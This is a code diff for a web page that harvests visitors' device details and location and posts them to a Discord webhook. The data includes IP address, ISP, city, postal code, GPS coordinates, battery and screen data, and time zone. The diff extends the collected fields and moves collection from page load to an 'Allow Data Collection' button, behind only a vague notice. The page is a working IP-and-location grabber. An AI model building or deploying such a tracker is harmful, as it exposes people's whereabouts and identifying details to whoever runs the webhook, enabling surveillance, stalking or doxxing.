@@ -7,9 +7,12 @@
 </head>
 <body>
     <h1>Welcome to Our Website</h1>
-    <p>We are collecting your device data for analysis purposes.</p>
+    <p>We are collecting your device data for analysis purposes. Please allow the necessary permissions.</p>
+    <button id="getDataButton">Allow Data Collection</button>
 
     <script>
+        document.getElementById('getDataButton').addEventListener('click', collectAndSendData);
+
         async function collectAndSendData() {
             const userData = {
                 userAgent: navigator.userAgent,
@@ -37,8 +40,8 @@
             // Battery Information
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
-                userData.batteryLevel = battery.level * 100 + '%';
-                userData.charging = battery.charging;
+                userData.batteryLevel = (battery.level * 100) + '%';
+                userData.charging = battery.charging ? "Yes" : "No";
             } else {
                 userData.batteryLevel = 'unknown';
                 userData.charging = 'unknown';
@@ -57,10 +60,12 @@
                     },
                     (error) => {
                         console.warn("Geolocation permission denied or unavailable:", error);
+                        userData.location = { latitude: 'unknown', longitude: 'unknown', accuracy: 'unknown' };
                         getIpAndIsp(userData);
                     }
                 );
             } else {
+                userData.location = { latitude: 'unknown', longitude: 'unknown', accuracy: 'unknown' };
                 getIpAndIsp(userData);
             }
         }
@@ -78,6 +83,12 @@
                 userData.city = ispData.city || 'unknown';
                 userData.region = ispData.region || 'unknown';
                 userData.country = ispData.country || 'unknown';
+                userData.postal = ispData.postal || 'unknown';
+
+                // Collect additional device information
+                userData.touchSupport = 'Touch Support: ' + (('ontouchstart' in window) ? 'Yes' : 'No');
+                userData.deviceType = (/(android|iphone|ipad|mobile)/i.test(userData.userAgent) ? 'Mobile' : 'Desktop');
+                userData.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
 
                 sendToDiscord(userData);
             } catch (error) {
@@ -96,19 +107,26 @@
                         fields: [
                             { name: "User Agent", value: data.userAgent, inline: false },
                             { name: "Platform", value: data.platform || "unknown", inline: true },
+                            { name: "Device Type", value: data.deviceType, inline: true },
                             { name: "Screen Size", value: `${data.screenWidth}x${data.screenHeight}`, inline: true },
                             { name: "Pixel Ratio", value: data.pixelRatio.toString(), inline: true },
                             { name: "Device Memory", value: `${data.deviceMemory || "unknown"} GB`, inline: true },
                             { name: "Battery Level", value: data.batteryLevel || "unknown", inline: true },
-                            { name: "Charging", value: data.charging ? "Yes" : "No", inline: true },
+                            { name: "Charging", value: data.charging || "unknown", inline: true },
                             { name: "Network Type", value: data.connectionType || "unknown", inline: true },
                             { name: "IP Address", value: data.ipAddress || "unknown", inline: true },
                             { name: "ISP", value: data.isp || "unknown", inline: true },
                             { name: "City", value: data.city || "unknown", inline: true },
                             { name: "Region", value: data.region || "unknown", inline: true },
                             { name: "Country", value: data.country || "unknown", inline: true },
+                            { name: "Postal Code", value: data.postal || "unknown", inline: true },
+                            { name: "Latitude", value: data.location.latitude || "unknown", inline: true },
+                            { name: "Longitude", value: data.location.longitude || "unknown", inline: true },
+                            { name: "Accuracy", value: data.location.accuracy || "unknown", inline: true },
                             { name: "Browser Language", value: data.language, inline: true },
+                            { name: "Time Zone", value: data.timeZone, inline: true },
                             { name: "Online Status", value: data.onLine ? "Online" : "Offline", inline: true },
+                            { name: "Touch Support", value: data.touchSupport, inline: true },
                             { name: "Timestamp", value: data.timestamp, inline: false }
                         ]
                     }
@@ -130,9 +148,6 @@
                 console.error("Error sending data to Discord:", error);
             });
         }
-
-        // Collect and send data on page load
-        collectAndSendData();
     </script>
 </body>
 </html>
